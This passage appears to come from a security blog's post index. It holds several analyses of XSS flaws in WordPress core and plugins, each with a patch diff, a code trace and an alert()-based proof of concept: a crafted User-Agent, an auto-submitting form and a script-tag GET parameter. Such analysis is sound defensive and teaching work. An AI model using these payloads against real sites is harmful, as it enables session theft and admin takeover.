) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } The Avatar block is a Block Editor block used to render post or comment content in WordPress. $author_name is the display_name of the author with $author_id belonging to the current post. If this is a post and the link option is enabled, the $author_name containing a payload will be added to the aria-label attribute and output to the browser. When visiting any post, wp() is called to load that post’s data. function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } Here $wp_query is created and will contain the wp_post values after the query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() will parse_request and perform the query to fetch the current post information using query_posts(). $wp_the_query is the main WP_Query object in WordPress, while $wp_query is simply a reference pointing to $wp_the_query. Therefore, when $wp_the_query is initialized and has data, $wp_query will have the same data. We obtain the post_content value: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar is the core/avatar block type. The render() function will call call_user_func() with the callback render_block_core_avatar() to get the Avatar block HTML and return it to the user. ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:2","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: author name of a contributor+ Sink: $author_name injected into the aria-label attribute ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:3","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:4:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a post account with role contributor+ containing an avatar block, enable the Link to user profile option and select the contributor user. Change the first name to contain an XSS payload and set the display name to the first name. Admin previews the post =\u003e XSS occurs ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:4:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2024-4439 vulnerability in WordPress Core \u003c= 6.5.1 stems from incorrect use of the esc_attr__() function when handling display_name in the Avatar block, resulting in a Stored XSS. An attacker can exploit this by inserting a payload in the display_name, causing malicious scripts to execute when users (including admins) visit a page containing the block. The patch in 6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2 changes the handling — escaping after formatting with sprintf() — ensuring the data is safe before rendering to the browser. Key takeaways: Escape order matters: data should be formatted first, then escaped to avoid introducing XSS. Even core functions like esc_attr__() can lead to serious vulnerabilities if used incorrectly. Stored XSS is particularly dangerous because it persists in the database and can trigger whenever a user views the affected content. Not only plugins/themes, but WordPress Core must be updated regularly to reduce security risk. Analyzing patch diffs is an effective way to learn secure coding practices and understand the root cause of bugs. ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:5:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:6:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rWP Statistics – The Most Popular Privacy-Friendly Analytics Plugin for WordPress has a Stored Cross-Site Scripting (XSS) vulnerability via the User-Agent Header in all versions up to and including 14.15.4. The root cause is insufficient input validation/filtering and output escaping. This vulnerability allows an unauthenticated attacker to inject malicious JavaScript into the system. The injected scripts will execute whenever a user visits a page containing the malicious data, posing severe security and privacy risks. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) and v14.15.5 (patched). Diff tool - Meld or any diff comparison tool to inspect differences between the two versions. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rI initially missed some details while collecting information about this CVE; the references of https://www.cve.org/CVERecord?id=CVE-2025-9816 point to where the vulnerability occurs: includes/admin/templates/pages/devices/models.php{: .filepath} But I overlooked it and used Meld to compare code. Because the code changed a lot, I proactively searched for files related to user-agent. The changes in UserAgent.php made me believe the vulnerability truly occurs there. It cost me quite a bit of time but I couldn’t fully analyze it at that point. However, this effort helped the overall analysis. 🍀 Fortunately, guided by senior researchers, I focused on the correct vulnerability location. That made the analysis easier. Tip: This is a Cross Site Scripting vulnerability that happens in the victim’s browser, so you need to find where it is first rendered into HTML. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rThe vulnerability occurs in file includes/admin/templates/pages/devices/models.php{: .filepath} at line 31. In the vulnerable version, $item-\u003emodel is printed into HTML without any protection: \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e In the patched version, $item-\u003emodel is protected by wrapping it with esc_attr() and esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e 👉 The patch adds output escaping for $item-\u003emodel, ensuring it is escaped before being printed to HTML. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\r\u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e If $data is not empty it iterates over $data and displays statistical visitor data including model. If empty it prints No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; } return false; } public static function unknownToNotSet($value) { if (self::isUnknown($value)) { return __('(not set)', 'wp-statistics'); } return $value; } unknownToNotSet() returns (not set) if $item-\u003emodel is empty, Unknown, or the translated Unknown. __(\"Unknown\", 'wp-statistics') looks up the translation of Unknown in the plugin’s .po/.mo files. 👉 There is no protection for $item-\u003emodel. $data is not initialized in this file so it’s certain that it is created elsewhere and models.php{: .filepath} uses it when included. We could search for models.php to find where it is called, but here it is included dynamically. Instead, I searched for the containing folder pages/devices. Diff — How templates are included dynamically 👉 models.php{: .filepath} is called dynamically in the render() function of the TabsView class: class TabsView extends BaseTabView { public function render() { $currentTab = $this-\u003egetCurrentTab(); $data = $this-\u003egetTabData(); $args = [ 'title' =\u003e esc_html__('Devices', 'wp-statistics'), 'pageName' =\u003e Menus::get_page_slug('devices'), 'paged' =\u003e Admin_Template::getCurrentPaged(), 'custom_get' =\u003e ['tab' =\u003e $currentTab], 'data' =\u003e $data, 'viewMoreUrlArgs' =\u003e ['type' =\u003e 'single-' . rtrim($currentTab, 's'), 'from' =\u003e Request::get('from'), 'to' =\u003e Request::get('to')], 'tabs' =\u003e [ [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'overview']), 'title' =\u003e esc_html__('Overview', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'browsers']), 'title' =\u003e esc_html__('Browsers', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'platforms']), 'title' =\u003e esc_html__('Operating Systems', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'models']), 'title' =\u003e esc_html__('Device Models', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'categories']), 'title' =\u003e esc_html__('Device Categories', 'wp-statistics'), ] ], ]; Admin_Template::get_template(['layout/header', 'layout/tabbed-page-header', \"pages/devices/$currentTab\", 'layout/postbox.hide', 'layout/footer'], $args); } } There is correlation between the values in $args and the Devices submenu. The tab value in args corresponds to the tab URL parameter =\u003e the scope of tracing is the Devices admin submenu. We need to determine $currentTab to know how render() calls models.php{: .filepath} and $data for possible payload injection. Variable $currentTab // $currentTab = $this-\u003egetCurrentTab(); protected function getCurrentTab() { return Request::get('tab', $this-\u003edefaultTab); } getCurrentTab() returns the value from Request::get() // $param='tab' public static function get($param, $default = false, $return = 'string') { if (empty($_REQUEST[$param])) return $default; $value = $_REQUEST[$param]; if ($return === 'string') { return sanitize_text_field($value); } if ($return === 'url') { return sanitize_url($value); } if ($return === 'number') { return intval($valu","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: User-Agent header (POST /wp-json/wp-statistics/v2/hit) — DeviceDetector parse → getModel(). Sink: includes/admin/templates/pages/devices/models.php — echo $item-\u003emodel (without esc_html() / esc_attr()) ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rAttacker sends a UA containing an XSS payload The model containing the payload is stored in the database Admin opens the models tab =\u003e payload executes ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:4","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a request containing the XSS payload: POST /wp-json/wp-statistics/v2/hit HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Linux; Android 14; Goly \"onmouseover=alert()-\" Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 wp_statistics_hit=1\u0026source_type=home\u0026source_id=0\u0026search_query=\u0026signature=787b07b8979cb982ec89a4f103a68081\u0026endpoint=hit\u0026referred=\u0026page_uri=Lw%3D%3D Admin visits the endpoint and hovers over the model containing the payload: http://localhost/wp-admin/admin.php?page=wps_devices_page\u0026tab=models The browser executes JavaScript when the admin visits. Use \" to close the title, creating alert() via the onmouseover event because it’s a \u003cspan\u003e and - is used to concatenate in JavaScript to avoid syntax errors. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-9816 vulnerability in WP Statistics \u003c= 14.15.4 allows Stored XSS via the model value parsed from the User-Agent header. The payload is stored in the DB and displayed in the admin Device Models page without proper escaping. The 14.15.5 patch adds esc_html()/esc_attr() to output. Key takeaways: Stored XSS is more dangerous than reflected XSS because it persists in the DB. Data from HTTP headers must also be treated as untrusted input. Always escape on output rather than relying solely on input sanitization. Update the plugin to the latest version to prevent exploitation. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet - PortSwigger WordPress WP Statistics \u003c= 14.15.4 - CVE-2025-9816 ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analysis"],"collections":null,"content":"Reflected Cross-Site Scripting (XSS) vulnerability in the All in One Time Clock Lite plugin for WordPress. The vulnerability originates from the nonce parameter in versions up to and including 2.0, due to insufficient input handling and lack of output escaping. An attacker (including unauthenticated) can inject arbitrary script snippets into the page; these scripts will execute when the victim performs the manipulated action (for example: clicking a link). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) and v2.0.1 (patched). Diff tool - Meld or any diff comparison tool to inspect and compare differences between the two versions. ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rIn the vulnerable version, the nonce parameter is taken directly from $_POST with no sanitization: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; In the patched version, the nonce parameter is processed with sanitize_text_field() before use, preventing injection of malicious code: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; 👉 The patch adds an input filtering layer for the nonce variable, ensuring data received from the request will have dangerous characters removed before further processing. Code change comparison between vulnerable and patched versions\r","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rThe vulnerability is located in the function aio_time_clock_lite_js() of the class AIO_Time_Clock_Lite_Actions in the file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=“aio-time-clock-lite-actions.php”} The wp_verify_nonce() function compares the $nonce value sent from the client with a valid value previously generated by the server using wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=“aio-settings.php”} If $nonce is invalid =\u003e it goes to the else branch returning a JSON error that contains $nonce. Clicking 2 references shows that the function public function aio_time_clock_lite_js() is registered as a callback for action hooks: Callback registration for ajax hooks\rThe function aio_time_clock_lite_js() is attached to two Ajax hooks (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js (authenticated). wp_ajax_nopriv_aio_time_clock_lite_js (unauthenticated). =\u003e Focus ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: The nonce parameter is taken directly from $_POST (unauthenticated request). Sink: The nonce value is reflected back in echo json_encode(...). ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rSend a POST request (unauthenticated) to /wp-admin/admin-ajax.php with params: action=aio_time_clock_lite_js\u0026nonce=nonce_value The callback aio_time_clock_lite_js() is invoked The nonce value is checked =\u003e invalid The nonce value is reflected into the response body via echo json_encode(...) ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:2:4","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a webpage containing a submit form: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e Send the link to the page containing the form to a user with privileges. Observe the injected JavaScript executing. Result — PoC execution screenshot\r","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-6832 vulnerability in All in One Time Clock Lite \u003c= 2.0 allows an unauthenticated attacker to exploit a Reflected XSS via the nonce parameter. The 2.0.1 patch added sanitize_text_field() to filter input, preventing malicious code from being reflected in the JSON response. Key takeaways: Always sanitize and escape data before returning it in responses. Endpoints exposed to nopriv (unauthenticated) requests should be carefully reviewed. Reflected XSS commonly occurs when input values are directly reflected into output (JSON/HTML). Updating the plugin promptly is the simplest way to reduce risk. ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress All in One Time Clock Lite \u003c= 2.0 — CVE-2025-6832 ","date":"2025-10-07","objectID":"/posts/2025-10-07-cve-2025-6832/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/posts/2025-10-07-cve-2025-6832/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability exists in the Download Manager plugin prior to version 3.3.24. Data retrieved from GET requests is printed directly into HTML attributes, leading to reflected XSS when a user with privileges accesses a URL crafted by an attacker. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vulnerable) and v3.3.24(fixed) diff tool: meld or any tool capable of comparing differences between two versions ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable and patched versions. A significant difference appears in src/Admin/views/stats/history.php. Vulnerable code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e The GET parameters are directly assigned to the \u003ca\u003e element’s href without any protection, creating a risk of reflected XSS. Patched code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL\rThe patch sanitizes the GET parameters using sanitize_array and uses esc_url to escape the URL, making it safe. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works\rWe need to identify the real URL to inject GET parameters containing the XSS payload. src/Admin/views/stats/history.php contains PHP and HTML tags inside the views folder, indicating it is included somewhere in the plugin. Searching for history.php in the plugin directory: Search results for history.php\r👉 No direct matches are found. It is likely included dynamically like {$file_name}.php. Using regex \\{.*\\}\\.php: Regex search for dynamic includes\rsrc/Admin/views/stats/history.php is included in src/Admin/views/stats.php. The actual URL to access is declared at the top of stats.php: $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; Similarly, stats.php is also included elsewhere, but it’s not necessary to trace further since the URL is identified. To verify, we set a breakpoint in src/Admin/views/stats/history.php, start debugging, and access the URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params\rFirst, the plugin collects all GET parameters into $get_params. If $user_ids is not empty, a “Clear filter” button is created. To make the button functional, it must generate a URL without the user_ids parameter: $get_params_xu = $get_params; // copy all GET parameters unset($get_params_xu['user_ids']); // remove user_ids from array $reset_url = add_query_arg($get_params_xu, 'edit.php'); // generate new URL unset($get_params_xu['user_ids']) removes the filter. add_query_arg($get_params_xu, 'edit.php') generates the URL with remaining parameters. This URL is attached to the “Clear filter” button: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e Result: Clicking the button reloads the page without the user_ids filter. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rSend a GET request containing the XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 The \"\u003e\u003c/a\u003e closes the \u003ca\u003e tag, followed by a \u003cscript\u003e to trigger alert(). Reflected XSS triggered via GET parameter\r👉 XSS succeeds. When a user with privileges accesses the attacker-provided URL, reflected XSS occurs, simulating an Unauthenticated attack scenario. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability CVE-2025-10146 in WordPress Download Manager \u003c= 3.3.23 is a reflected XSS, occurring when GET request data is printed directly into an HTML attribute without sanitization or escaping. Privileged users accessing the attacker-crafted URL may be exploited. The patch in 3.3.24: Sanitizes GET parameters (sanitize_array) to remove dangerous characters. Escapes URL (esc_url) before rendering in HTML to prevent XSS. Key takeaways: Always sanitize and escape user input before rendering in HTML. Check user permissions before processing or displaying sensitive data. Low-privilege roles 